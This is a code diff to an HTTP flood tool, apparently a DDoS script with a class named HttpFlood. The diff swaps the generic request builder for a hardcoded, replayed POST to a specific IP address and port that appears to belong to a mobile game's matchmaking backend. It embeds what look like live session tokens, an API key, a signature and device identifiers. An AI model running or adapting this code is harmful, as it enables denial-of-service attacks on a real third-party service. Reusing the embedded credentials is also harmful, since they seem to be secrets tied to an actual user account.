@@ -795,11 +795,7 @@ class HttpFlood(Thread):
                 f'Real-IP: {spoof}\r\n')
 
     def generate_payload(self, other: str = None) -> bytes:
-        return str.encode((self._payload +
-                           f"Host: {self._target.authority}\r\n" +
-                           self.randHeadercontent +
-                           (other if other else "") +
-                           "\r\n"))
+        return str.encode("POST http://130.61.18.134:9902/v1/dispatch HTTP/1.1\r\nx-shahe-uid: 8878880\r\nx-shahe-token: eyJhbGciOiJSUzI1NiJ9.eyJ1aWQiOjg4Nzg4ODAsImd0eXBlIjoiZzEwMDgiLCJpc3MiOiI4ODc4ODgwIiwiZXhwIjoxNzQwMDYyNzMzfQ.lnkGricbr-KCQFRez7BapVYOWchAvojtjQEXcuHJdTFg9biRDXiHNWhYnPBGQsMVS5CNpU1_jsVD8IRAmzOM6jXA1pCQVfK30NwveFQ_jK4LXn34UNCqzLMWTY6C2V2-oufQcC1M8K0GWGPpJMEDvPlClpOFnIpoK6XLJoUFNTwp3gKVpNJgR4RIJeIk2388O7xUgNlI-JKIhgbKaVEDVV4oBbjGf9fbNgk68y-ZQd1F-slf-Rheev-Nnv68Duq0OTUKqMFg4jV92DnNu7hC66Gww0XP5q0gyGZGM--vnouHhFyVHy6TJ4PpobN7gnBia2lYgH5wbRfnjfajbYKxkQ\r\nuserId: 8878880\r\npackageName: blockymods\r\npackageNameFull: com.sandboxol.blockymods\r\nandroidVersion: 30\r\nOS: android\r\nappType: android\r\nappLanguage: en\r\nappVersion: 5212\r\nappVersionName: 2.104.2\r\nchannel: sandbox\r\nuid_register_ts: 1520827184\r\ndevice_register_ts: 1718718484\r\neventType: app\r\nuserDeviceId: f214e1d788c7df93\r\nuserLanguage: en_US\r\nregion: RU\r\nclientType: client\r\nenv: prd\r\npackage_name_en: com.sandboxol.blockymods\r\nmd5: 5d0de77b0f4b93b44669f146e54b49d9\r\nX-ApiKey: 6aDtpIdzQdgGwrpP6HzuPA\r\nX-Nonce: 1322382c-3845-432f-85ee-bc97d4ad156f\r\nX-Time: 1740062138\r\nX-Sign: 80d08b83d36d66cb7e97e026a9bef31b\r\nX-UrlPath: /v1/dispatch\r\nAccess-Token: ELPJaCzz5+V0e25U08NkzF3yNgcLHlLBeYSU4fJvPkMlGgTzfEqXwTRlW++nSbW0Gb+M7d8rdnSaKPEQRFXVl91D1TO7oDF+h06IQiLYlqKWhabp2iOVczkGul1unbAAhenuOJldTuLhZJCla+F3l0/151hcyIABmeqtwX8VsGOlfO2EjRPSFgnM12473qMGOLnYIy4BlhH2S1GsvJlDO9zel8KI47+xcCpyVaDSUNAWbXq6lTonJL8sKbd18V0igv13Q0rgSox/HNAG0JDGIrc0xdEHssHvPrOKJbYrPFzDb4FfooKgxGk81yw8iSFBTswC4Niaa+OC0KLfcogzdQ==\r\nContent-Type: application/json; charset=UTF-8\r\nHost: 130.61.18.134:9902\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nUser-Agent: okhttp/4.11.0\r\nContent-Length: 299\r\n\r\n{\"country\":\"RU\",\"targetId\":8878880,\"appVer\":\"5212\",\"retryCount\":0,\"excludeIps\":[\"\"],\"pioneer\":true,\"rid\":8029,\"clz\":0,\"ever\":10109,\"picUrl\":\"http://staticgs.sandboxol.com/sandbox/avatar/1722350941634476.jpg\",\"clientType\":1,\"name\":\"NULLОWNS\",\"mapId\":\"m1008_2\",\"packageName\":\"blockymods\",\"lang\":\"en\"}")
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
@@ -835,11 +831,7 @@ class HttpFlood(Thread):
             else "REQUESTS"
 
     def POST(self) -> None:
-        payload: bytes = self.generate_payload(
-            ("Content-Length: 44\r\n"
-             "X-Requested-With: XMLHttpRequest\r\n"
-             "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
+        payload: bytes = self.generate_payload()
         s = None
         with  suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
